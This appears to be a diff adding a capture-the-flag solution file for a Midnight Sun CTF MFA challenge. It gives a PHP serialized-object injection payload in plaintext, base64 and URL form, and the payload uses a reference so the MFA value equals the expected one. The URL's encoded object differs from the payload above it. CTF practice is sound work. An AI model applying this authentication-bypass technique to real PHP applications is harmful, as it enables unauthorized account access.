@@ -1,0 +1,9 @@
+# plaintext
+O:8:"stdClass":4:{s:13:"_correctValue";N;s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:3:"mfa";R:2;}
+
+# base64
+Tzo4OiJzdGRDbGFzcyI6NDp7czoxMzoiX2NvcnJlY3RWYWx1ZSI7TjtzOjg6InVzZXJuYW1lIjtzOjExOiJEMGxvcmVzSDR6ZSI7czo4OiJwYXNzd29yZCI7czoxMzoicmFzbXVzbGVyZG9yZiI7czozOiJtZmEiO1I6Mjt9
+
+# url
+https://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo4OiJzdGRDbGFzcyI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MzoibWZhIjtzOjEwOiIxMjM0NTY3ODkwIjt9
+
